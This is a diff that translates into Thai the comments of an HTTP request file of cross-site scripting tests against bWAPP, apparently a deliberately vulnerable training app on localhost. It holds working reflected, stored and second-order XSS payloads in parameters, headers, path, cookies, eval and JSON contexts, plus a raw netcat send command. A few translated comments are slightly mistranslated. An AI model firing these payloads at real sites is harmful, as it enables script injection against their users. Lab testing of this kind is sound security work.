@@ -1,7 +1,7 @@
 ### ============================================================================
 ### 02 - A7 Cross-Site Scripting (XSS)
-###   Every reflected sink below writes attacker input straight into the HTML
-###   with no encoding at security level 0 (functions_external.php::no_check).
+###   ทุก reflected sink ด้านล่างเขียน input ของผู้โจมตีลง HTML ตรง ๆ
+###   โดยไม่ encode เลยที่ security level 0 (functions_external.php::no_check)
 ###
 ###   Reflected sinks: xss_get.php, xss_post.php, xss_referer.php,
 ###                    xss_user_agent.php, xss_href-2.php, xss_php_self.php,
@@ -11,17 +11,17 @@
 ### ============================================================================
 
 ### ---------------------------------------------------------------------------
-### XSS-01  Reflected, GET parameters (xss_get.php)
-###   Marker to look for in the response:  <script>alert(1)</script>
+### XSS-01  Reflected, parameter แบบ GET (xss_get.php)
+###   marker ที่ต้องมองหาใน response:  <script>alert(1)</script>
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/xss_get.php?firstname=%3Cscript%3Ealert(1)%3C%2Fscript%3E&lastname=x HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, the raw <script> tag is echoed back unencoded
+### Expected: 200, tag <script> ดิบถูก echo กลับมาโดยไม่ encode
 
 
 ### ---------------------------------------------------------------------------
-### XSS-02  Reflected, POST parameters (xss_post.php)
+### XSS-02  Reflected, parameter แบบ POST (xss_post.php)
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/xss_post.php HTTP/1.1
 Host: localhost:8443
@@ -29,112 +29,112 @@ Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 firstname=%3Cscript%3Ealert(1)%3C%2Fscript%3E&lastname=x&form=submit
-### Expected: 200, raw <script> tag in the "Welcome ..." line
+### Expected: 200, tag <script> ดิบอยู่ในบรรทัด "Welcome ..."
 
 
 ### ---------------------------------------------------------------------------
-### XSS-03  Reflected via the Referer request header (xss_referer.php)
-###   Any inbound request header is a reflection sink, so header-based WAF
-###   rules that only inspect the body will miss this.
+### XSS-03  Reflected ผ่าน request header Referer (xss_referer.php)
+###   request header ที่เข้ามาทุกตัวคือจุด reflection ดังนั้นกฎ WAF ที่
+###   ตรวจแค่ body จะมองข้ามเคสนี้
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/xss_referer.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
 Referer: <script>alert(1)</script>
-### Expected: 200, payload reflected into the page
+### Expected: 200, payload สะท้อนกลับเข้าไปในหน้าเว็บ
 
 
 ### ---------------------------------------------------------------------------
-### XSS-04  Reflected via the User-Agent header (xss_user_agent.php)
+### XSS-04  Reflected ผ่าน header User-Agent (xss_user_agent.php)
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/xss_user_agent.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
 User-Agent: <script>alert(1)</script>
-### Expected: 200, payload reflected into the page
+### Expected: 200, payload สะท้อนกลับเข้าไปในหน้าเว็บ
 
 
 ### ---------------------------------------------------------------------------
-### XSS-05  Reflected into a custom request header (xss_custom_header.php)
-###   The page iterates getallheaders() and echoes only the one literally named
-###   "bWAPP" - a header that no browser UI lets you set, which is exactly why
-###   this class of bug is easy to miss in a manual review.
+### XSS-05  Reflected เข้า custom request header (xss_custom_header.php)
+###   หน้านี้วน getallheaders() แล้ว echo เฉพาะตัวที่ชื่อ
+###   "bWAPP" ตรง ๆ - header ที่ UI ของเบราว์เซอร์ไม่มีให้ตั้ง ทำให้บั๊ก
+###   ประเภทนี้มองข้ามง่ายตอน review แบบ manual
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/xss_custom_header.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
 bWAPP: <script>alert(1)</script>
-### Expected: 200, "<i><script>alert(1)</script></i>" in the output
+### Expected: 200, เจอ "<i><script>alert(1)</script></i>" ใน output
 
 
 ### ---------------------------------------------------------------------------
-### XSS-06  $_SERVER["PHP_SELF"] - payload in the URL PATH, not a parameter
-###   This is the classic "PHP_SELF is attacker-controlled" bug. The payload
-###   sits after the .php suffix and before the query string, so no query
-###   string parser or input filter ever sees it.
-###   Verified by hand: the response contains
+### XSS-06  $_SERVER["PHP_SELF"] - payload อยู่ใน PATH ของ URL ไม่ใช่ parameter
+###   นี่คือบั๊กคลาสสิกแบบ "PHP_SELF อยู่ในมือผู้โจมตีได้" payload จะ
+###   อยู่หลังนามสกุล .php และก่อน query string ดังนั้น parser หรือ input
+###   filter ของ query string ไม่มีโอกาสเห็นมัน
+###   ตรวจด้วยตาแล้ว response มี
 ###     <form action="/xss_php_self.php/<script>alert(1)</script>" method="GET">
-###   so the payload escapes the quoted attribute and executes.
-###   Two Apache behaviours worth recording:
-###     - a PATH_INFO containing an encoded double quote (%22) is answered 404,
-###       so the usual %22%3E attribute-breakout prefix does not work here; the
-###       bug does not need it, PHP_SELF already lands in a quoted attribute
-###       with no encoding applied.
-###     - a PATH_INFO with LITERAL < and > is also answered 404.
-###   NOT SENT BY THE RUNNER: .NET's System.Uri unescapes %3C/%3E before the
-###   request line is written, which turns the encoded payload into the literal
-###   one that Apache rejects. Send it with a raw client:
+###   payload จึงหลุดออกจาก attribute ที่อยู่ในเครื่องหมายคำพูดแล้ว execute ได้
+###   พฤติกรรมของ Apache สองข้อที่ควรบันทึกไว้:
+###     - PATH_INFO ที่มี double quote แบบ encode (%22) ตอบกลับ 404
+###       prefix %22%3E ที่ใช้หลุด attribute ตามปกติจึงใช้ไม่ได้ที่นี่ แต่บั๊ก
+###       ไม่ต้องใช้ เพราะ PHP_SELF ไปตกใน attribute ที่อยู่ในเครื่องหมายคำพูด
+###       อยู่แล้วและไม่มีการ encode
+###     - PATH_INFO ที่มี < และ > แบบตรงตัวก็ตอบ 404 เช่นกัน
+###   NOT SENT BY THE RUNNER: System.Uri ของ .NET จะ unescape %3C/%3E ก่อน
+###   เขียน request line ทำให้ payload ที่ encode ไว้กลายเป็นตัวตรง ๆ ที่ Apache
+###   ปฏิเสธ ต้องใช้ client ดิบส่งเอง:
 ###     printf 'GET /xss_php_self.php/%%3Cscript%%3Ealert(1)%%3C/script%%3E?firstname=a&lastname=b&form=submit HTTP/1.1\r\nHost: localhost:8443\r\nCookie: PHPSESSID=<id>\r\nConnection: close\r\n\r\n' | nc localhost 8443
-###   In a browser, just visit the URL - this is a live, exploitable XSS.
+###   ถ้าใช้เบราว์เซอร์แค่เปิด URL นี้ก็ได้ - เป็น XSS ที่ exploit ได้จริง
 ### ---------------------------------------------------------------------------
 ### SKIP
-### RUNNER-CANNOT-SEND: System.Uri unescapes the encoded payload in the path
+### RUNNER-CANNOT-SEND: System.Uri unescape payload ที่ encode ไว้ใน path
 GET {{baseUrl}}/xss_php_self.php/%3Cscript%3Ealert(1)%3C%2Fscript%3E?firstname=a&lastname=b&form=submit HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
 ### EXPECT-STATUS: 200
 ### EXPECT-BODY: <form action="/xss_php_self.php/<script>alert(1)</script>"
-### Expected: 200, the <form action="..."> attribute is broken out of
+### Expected: 200, attribute <form action="..."> ถูก breakout ออกมา
 
 
 ### ---------------------------------------------------------------------------
-### XSS-07  Reflected inside an <a href> (xss_href-1.php -> xss_href-2.php)
-###   xss_href-1.php just renders a form; the reflection lands on href-2.
+### XSS-07  Reflected ใน <a href> (xss_href-1.php -> xss_href-2.php)
+###   xss_href-1.php แค่ render form จุดที่สะท้อนค่าอยู่ที่ href-2
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/xss_href-2.php?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E&action=vote HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, payload reflected in the vote page
+### Expected: 200, payload สะท้อนในหน้า vote
 
 
 ### ---------------------------------------------------------------------------
-### XSS-08  eval() sink (xss_eval.php)
-###   Server-side: eval("document.write(" . xss($_GET["date"]) . ")")
-###   Breaking out of the write() call gives script execution in the browser.
+### XSS-08  จุดรับ eval() (xss_eval.php)
+###   ฝั่ง server: eval("document.write(" . xss($_GET["date"]) . ")")
+###   พังออกจาก write() ได้ ก็ execute script ในเบราว์เซอร์ได้ทันที
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/xss_eval.php?date=1)%3Balert(1)%3B%2F%2F HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, the emitted script reads: document.write(1);alert(1);//)
+### Expected: 200, script ที่ถูก emit ออกมาอ่านได้ว่า: document.write(1);alert(1);//)
 
 
 ### ---------------------------------------------------------------------------
-### XSS-09  JSON context injection (xss_json.php)
-###   The response is embedded in a JS string literal:
+### XSS-09  inject เข้า context ของ JSON (xss_json.php)
+###   response ถูกฝังอยู่ใน string literal ของ JS:
 ###     var JSONResponseString = '<?php echo $string ?>';
-###   Breaking the string literal escapes into arbitrary JS.
+###   พัง string literal ออกมาแล้วจะหลุดไปเขียน JS ได้อย่างอิสระ
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/xss_json.php?title=%27%3Balert(1)%3B%2F%2F&action=search HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, JSONResponseString contains ';alert(1);//'
+### Expected: 200, JSONResponseString มี ';alert(1);//'
 
 
 ### ---------------------------------------------------------------------------
-### XSS-10  STORED XSS via the blog (xss_stored_1.php)
-###   The submit button is `blog`, and entry_add / entry_all are checkboxes -
-###   send entry_add=on and entry_all=on or the entry is never rendered back.
-###   Persistence means this fires for EVERY later visitor, not just the author.
+### XSS-10  STORED XSS ผ่าน blog (xss_stored_1.php)
+###   ปุ่ม submit ชื่อ `blog` และ entry_add / entry_all เป็น checkbox -
+###   ต้องส่ง entry_add=on กับ entry_all=on ไม่งั้น entry จะไม่ถูก render กลับ
+###   การถูกเก็บไว้แปลว่ามันยิงกับผู้เข้าชมทุกคนในภายหลัง ไม่ใช่แค่ผู้เขียน
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/xss_stored_1.php HTTP/1.1
 Host: localhost:8443
@@ -142,13 +142,13 @@ Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 entry=%3Cscript%3Ealert(%22xss-stored-1%22)%3C%2Fscript%3E&blog=submit&entry_add=on&entry_all=on
-### Expected: 200, "xss-stored-1" appears in the blog listing below the form
-### Impact: any authenticated user who loads the blog now executes this
+### Expected: 200, "xss-stored-1" โผล่ในรายการ blog ด้านล่างฟอร์ม
+### Impact: user ที่ล็อกอินแล้วคนใดก็ตามที่เปิด blog ตอนนี้จะ execute สคริปต์นี้
 
 
 ### ---------------------------------------------------------------------------
-### XSS-11  STORED XSS via the user profile, fired on another page
-###   Step 1 of 2: poison the profile (user_extra.php writes firstname/lastname).
+### XSS-11  STORED XSS ผ่าน user profile แล้วยิงในอีกหน้า
+###   ขั้นที่ 1 จาก 2: ปั่นโทษ profile (user_extra.php เขียนค่า firstname/lastname)
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/user_extra.php HTTP/1.1
 Host: localhost:8443
@@ -156,39 +156,39 @@ Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 firstname=%3Cscript%3Ealert(%22stored2%22)%3C%2Fscript%3E&lastname=x&action=add&form=submit
-### Expected: 200, profile updated without complaint
+### Expected: 200, profile อัปเดตสำเร็จโดยไม่มีอะไรฟ้อง
 
 
 ### ---------------------------------------------------------------------------
-### XSS-12  STORED XSS step 2 of 2 - trigger it from an unrelated page
-###   This is second-order XSS: the payload is written in one request and
-###   executed in a completely different request/context.
+### XSS-12  STORED XSS ขั้นที่ 2 จาก 2 - ยิงจากหน้าที่ไม่เกี่ยวกัน
+###   นี่คือ second-order XSS: payload ถูกเขียนใน request หนึ่ง แล้วถูก
+###   execute ในอีก request/context ที่ไม่เกี่ยวกันเลย
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/xss_stored_2.php?genre=action&form=like HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, the stored name is rendered and the script executes
+### Expected: 200, ชื่อที่เก็บไว้ถูก render และ script ทำงาน
 
 
 ### ---------------------------------------------------------------------------
-### XSS-13  Reflected XSS through a COOKIE (smgmt_cookies_httponly.php)
-###   The page echoes $_COOKIE["top_security"] with no encoding. Because the
-###   value comes from a cookie, a single malicious Set-Cookie (from a sibling
-###   subdomain, or over plaintext HTTP) becomes a persistent XSS.
+### XSS-13  Reflected XSS ผ่าน COOKIE (smgmt_cookies_httponly.php)
+###   หน้านี้ echo $_COOKIE["top_security"] โดยไม่ encode เพราะค่านี้มาจาก
+###   cookie แค่ Set-Cookie อันเดียวที่เป็นพิษ (จาก subdomain พี่ หรือส่งผ่าน
+###   plaintext HTTP) ก็กลายเป็น XSS แบบคงอยู่ถาวรแล้ว
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/smgmt_cookies_httponly.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}; top_security=<script>alert("cookie")</script>
-### Expected: 200, the cookie value is echoed as live markup
+### Expected: 200, ค่าใน cookie ถูก echo ออกมาเป็น markup ที่ทำงานได้จริง
 
 
 ### ---------------------------------------------------------------------------
-### XSS-14  Context: what the "medium" security level actually does
-###   Re-send XSS-01 while the security_level cookie says 1. bWAPP applies
-###   htmlspecialchars-style filtering from functions_external.php, so the
-###   payload comes back encoded. Useful for the remediation section.
+### XSS-14  Context: security ระดับ "medium" ทำอะไรจริง ๆ
+###   ส่ง XSS-01 ซ้ำตอนที่ cookie security_level เป็น 1 bWAPP จะใส่ filter
+###   แบบ htmlspecialchars จาก functions_external.php ทำให้ payload
+###   กลับมาเป็นค่าที่ encode แล้ว ใช้อ้างอิงตอนเขียนส่วนแก้ไข
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/xss_get.php?firstname=%3Cscript%3Ealert(1)%3C%2Fscript%3E&lastname=x HTTP/1.1
 Host: localhost:8443
 Cookie: PHPSESSID={{session}}; security_level=1
-### Expected: 200, payload arrives as &lt;script&gt; - inert
+### Expected: 200, payload กลับมาเป็น &lt;script&gt; - inert
